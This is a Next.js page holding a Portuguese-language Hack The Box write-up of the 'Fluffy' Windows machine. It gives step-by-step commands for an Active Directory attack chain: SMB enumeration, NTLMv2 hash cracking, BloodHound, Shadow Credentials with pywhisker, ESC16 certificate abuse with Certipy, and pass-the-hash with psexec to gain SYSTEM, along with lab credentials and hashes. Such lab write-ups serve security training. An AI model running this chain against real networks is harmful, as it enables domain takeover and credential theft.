import { Metadata } from "next"

export const metadata: Metadata = {
  title: "Fluffy Machine - HTB (Windows | Easy) | fe1ps",
  description: "A writeup of the Fluffy Machine Hack The Box machine.",
}

// Componente para blocos de código para evitar repetição
const CodeBlock = ({ children }: { children: React.ReactNode }) => (
  <pre className="bg-gray-900/50 p-4 rounded-md overflow-x-auto text-sm text-white/90 font-mono">
    <code>{children}</code>
  </pre>
);

// Componente para código inline
const InlineCode = ({ children }: { children: React.ReactNode }) => (
  <code className="bg-gray-700/50 text-orange-300 py-1 px-1.5 rounded-md text-sm font-mono">
    {children}
  </code>
);

// Componente para blocos de informação
const InfoBlock = ({ children }: { children: React.ReactNode }) => (
    <div className="bg-blue-900/30 border-l-4 border-blue-400 p-4 rounded-md my-4">
        {children}
    </div>
);
export default function FluffyMachineArticle() {
  return (
    <div className="py-12">
      <div className="container mx-auto px-4">
        <h1 className="text-4xl font-bold pt-4 mt-4 border-t border-white/30">Fluffy Machine - HTB (Windows | Easy)</h1>
        
        <div className="space-y-12"> {/* Aumentei o espaço para melhor legibilidade */}
          
          <InfoBlock>
              <p><strong>Resumo da Máquina</strong></p>
              <p><strong>IP:</strong> <InlineCode>10.10.11.69</InlineCode></p>
              <p><strong>SO:</strong> Windows</p>
              <p><strong>Vetor de Ataque:</strong> Enumeração de Active Directory, captura de hash NTLMv2, e escalação de privilégios via AD CS (Shadow Credentials & ESC16).</p>
          </InfoBlock>

          <p className="text-gray-400">
              <strong>Tags:</strong> <InlineCode>#activedirectory</InlineCode> <InlineCode>#windows</InlineCode> <InlineCode>#adcs</InlineCode> <InlineCode>#bloodhound</InlineCode> <InlineCode>#pywhisker</InlineCode> <InlineCode>#certipy</InlineCode> <InlineCode>#shadowcredentials</InlineCode> <InlineCode>#esc16</InlineCode>
          </p>
          
          <section>
            <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">👤 Credenciais Iniciais</h2>
            <ul className="list-disc list-inside mt-4 text-gray-300">
              <li><strong>Usuário:</strong> <InlineCode>j.fleischman</InlineCode></li>
              <li><strong>Senha:</strong> <InlineCode>J0elTHEM4n1990!</InlineCode></li>
            </ul>
          </section>

          <section>
            <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">🛠️ Ferramentas Utilizadas</h2>
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4 mt-4 text-gray-300">
              <span className="p-2 bg-gray-800/50 rounded text-center">nmap</span>
              <span className="p-2 bg-gray-800/50 rounded text-center">smbclient</span>
              <span className="p-2 bg-gray-800/50 rounded text-center">bloodhound</span>
              <span className="p-2 bg-gray-800/50 rounded text-center">pywhisker</span>
              <span className="p-2 bg-gray-800/50 rounded text-center">evil-winrm</span>
              <span className="p-2 bg-gray-800/50 rounded text-center">impacket</span>
              <span className="p-2 bg-gray-800/50 rounded text-center">hashcat</span>
              <span className="p-2 bg-gray-800/50 rounded text-center">ntpdate</span>
            </div>
          </section>

          <section>
            <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">⚠️ Erro: Clock skew too great</h2>
            <p className="mt-4 text-gray-300">
              Um problema comum em ambientes AD é a dessincronização de horário entre a máquina atacante e o alvo. Isso pode ser corrigido com o comando:
            </p>
            <CodeBlock>ntpdate 10.10.11.69</CodeBlock>
          </section>

          <section>
            <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">🔎 Enumeração Inicial</h2>
            <h3 className="text-xl font-semibold mt-4">Scan com Nmap</h3>
            <CodeBlock>nmap -T4 -p- -v -A -P0 10.10.11.69 -oX fluffy_tcp.scan --webxml</CodeBlock>
            <ul className="list-disc list-inside mt-4 text-gray-300">
              <li><strong>Domínio:</strong> <InlineCode>FLUFFY.HTB</InlineCode></li>
              <li><strong>Domain Controller (DC):</strong> <InlineCode>DC01.FLUFFY.HTB</InlineCode></li>
            </ul>
          </section>

          <section>
            <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">📁 Enumeração SMB</h2>
            <p className="mt-4 text-gray-300">
              Com as credenciais iniciais, listamos os compartilhamentos disponíveis no servidor.
            </p>
            <CodeBlock>{`smbclient -L //10.10.11.69 -U j.fleischman --password='J0elTHEM4n1990!'`}</CodeBlock>
            <p className="mt-4 text-gray-300">Shares encontrados:</p>
            <ul className="list-disc list-inside mt-2 text-gray-300">
              <li><InlineCode>ADMIN$</InlineCode>, <InlineCode>C$</InlineCode>, <InlineCode>IPC$</InlineCode>, <InlineCode>IT</InlineCode>, <InlineCode>NETLOGON</InlineCode>, <InlineCode>SYSVOL</InlineCode></li>
            </ul>
            <p className="mt-4 text-gray-300">O share <InlineCode>IT</InlineCode> parece promissor. Vamos acessá-lo:</p>
            <CodeBlock>{`smbclient //10.10.11.69/IT -U j.fleischman --password='J0elTHEM4n1990!'`}</CodeBlock>
            <p className="mt-4 text-gray-300">Arquivos encontrados no share:</p>
            <ul className="list-disc list-inside mt-2 text-gray-300">
              <li><InlineCode>Everything-1.4.1.1026.x64/</InlineCode></li>
              <li><InlineCode>Everything-1.4.1.1026.x64.zip</InlineCode></li>
              <li><InlineCode>KeePass-2.58/</InlineCode></li>
              <li><InlineCode>KeePass-2.58.zip</InlineCode></li>
              <li><InlineCode>Upgrade_Notice.pdf</InlineCode> ← <strong>Arquivo chave!</strong></li>
            </ul>
          </section>

          <section>
            <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">📝 Análise do PDF e Captura de Hash</h2>
            <p className="mt-4 text-gray-300">
              O arquivo <InlineCode>Upgrade_Notice.pdf</InlineCode> menciona várias CVEs, com destaque para a <strong>CVE-2025-24071</strong>. Esta vulnerabilidade permite a captura de hashes NTLMv2 ao forçar uma autenticação contra um listener SMB malicioso.
            </p>
            <p className="mt-4 text-gray-300">Após explorar a falha, o hash do usuário <strong>p.agila</strong> foi capturado.</p>
          </section>

          <section>
            <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">🔐 Cracking NTLMv2 com Hashcat</h2>
            <p className="mt-4 text-gray-300">O hash capturado foi quebrado com sucesso, revelando a seguinte credencial:</p>
            <ul className="list-disc list-inside mt-4 text-gray-300">
              <li><strong>Usuário:</strong> <InlineCode>p.agila</InlineCode></li>
              <li><strong>Senha:</strong> <InlineCode>prometheusx-303</InlineCode></li>
            </ul>
          </section>

          <section>
            <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">🧠 Análise com BloodHound</h2>
            <CodeBlock>{`bloodhound-python -d FLUFFY.HTB -u j.fleischman -p "J0elTHEM4n1990!" -gc dc01.fluffy.htb -c all -ns 10.10.11.69`}</CodeBlock>
            <p className="mt-4 text-gray-300">A análise do BloodHound revelou um caminho de privilégio interessante:</p>
            <ul className="list-disc list-inside mt-2 text-gray-300 font-mono text-sm">
              <li>p.agila ∈ SERVICE ACCOUNT MANAGERS</li>
              <li>SERVICE ACCOUNT MANAGERS → GenericAll → SERVICE ACCOUNTS</li>
              <li>SERVICE ACCOUNTS → GenericWrite → ca_svc, ldap_svc, winrm_svc</li>
            </ul>
            <p className="mt-4 text-gray-300">Isso significa que <InlineCode>p.agila</InlineCode> pode se adicionar ao grupo "SERVICE ACCOUNTS" e então modificar as contas de serviço.</p>
            <h3 className="text-xl font-semibold mt-4">Adicionando p.agila ao Grupo</h3>
            <CodeBlock>{`net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "FLUFFY.HTB/p.agila"%"prometheusx-303" -S "DC01.FLUFFY.HTB"`}</CodeBlock>
          </section>

          <section>
            <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">🧙 Abuso de Shadow Credentials (pywhisker)</h2>
            <p className="mt-4 text-gray-300">Com as novas permissões, podemos usar <InlineCode>pywhisker</InlineCode> para adicionar credenciais alternativas (Shadow Credentials) à conta de serviço <InlineCode>winrm_svc</InlineCode> e nos autenticar como ela.</p>
            <CodeBlock>{`pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"`}</CodeBlock>
            <CodeBlock>{`gettgtpkinit -cert-pem oBwGyENT_cert.pem -key-pem oBwGyENT_priv.pem fluffy.htb/winrm_svc winrm_svc.ccache`}</CodeBlock>
            <CodeBlock>export KRB5CCNAME=winrm_svc.ccache</CodeBlock>
          </section>
          
          <section>
            <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">📡 Acesso Inicial com Evil-WinRM</h2>
            <p className="mt-4 text-gray-300">Agora, com um TGT para <InlineCode>winrm_svc</InlineCode>, podemos obter seu hash NT e usar Evil-WinRM para ganhar um shell.</p>
            <CodeBlock>getnthash -key &lt;key&gt; fluffy.htb/winrm_svc</CodeBlock>
            <CodeBlock>{`evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767`}</CodeBlock>
            <p className="mt-4 font-bold text-lg text-green-400">USER FLAG PWNED 🎉</p>
          </section>
          
          <section>
            <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">🔐 Escalada de Privilégio (ESC16 via Certipy)</h2>
            <p className="mt-4 text-yellow-400 bg-yellow-900/30 p-3 rounded-md">
              ⚠️ <strong>Atenção:</strong> É crucial usar uma versão atualizada do Certipy, clonada diretamente do GitHub, para que a vulnerabilidade ESC16 funcione corretamente.
            </p>
            <p className="mt-4 text-gray-300">A mesma permissão de <InlineCode>GenericWrite</InlineCode> sobre contas de serviço se aplica a <InlineCode>ca_svc</InlineCode>. Vamos explorar isso para escalar privilégios para Administrador.</p>
            
            <h3 className="text-xl font-semibold mt-6">1. Obter Hash NT de ca_svc</h3>
            <CodeBlock>{`certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto`}</CodeBlock>
            <p className="mt-2 text-gray-400">Hash NT obtido: <InlineCode>ca0f4f9e9eb8a092addf53bb03fc98c8</InlineCode></p>
            
            <h3 className="text-xl font-semibold mt-6">2. Verificar Vulnerabilidade ESC16</h3>
            <CodeBlock>{`certipy-ad find -vulnerable -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -stdout`}</CodeBlock>
            
            <h3 className="text-xl font-semibold mt-6">3. Alterar UPN de 'ca_svc' para 'Administrator'</h3>
            <p className="mt-2 text-gray-300">Alteramos o User Principal Name (UPN) da conta de serviço para o do Administrador para podermos requisitar um certificado em seu nome.</p>
            <CodeBlock>{`certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update`}</CodeBlock>
            
            <h3 className="text-xl font-semibold mt-6">4. Requisitar Certificado como Administrator</h3>
            <CodeBlock>{`certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User' -upn 'administrator@fluffy.htb'`}</CodeBlock>
            
            <h3 className="text-xl font-semibold mt-6">5. Reverter UPN (Boa prática)</h3>
            <CodeBlock>{`certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update`}</CodeBlock>
            
            <h3 className="text-xl font-semibold mt-6">6. Autenticar com o Certificado e Obter Hash de Admin</h3>
            <CodeBlock>{`certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'`}</CodeBlock>
            <p className="mt-2 text-gray-400">Hash NT do Administrador: <InlineCode>8da83a3fa618b6e3a00e93f676c92a6e</InlineCode></p>
          </section>
          
          <section>
            <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">💣 Execução Final: Pass-the-Hash</h2>
            <p className="mt-4 text-gray-300">Com o hash NT do Administrador, usamos <InlineCode>psexec.py</InlineCode> do Impacket para obter um shell como SYSTEM.</p>
            <CodeBlock>{`impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e Administrator@10.10.11.69`}</CodeBlock>
            <p className="mt-4 font-bold text-lg text-red-500">SYSTEM FLAG PWNED 👑</p>
          </section>

        </div>
      </div>
    </div>
  )
}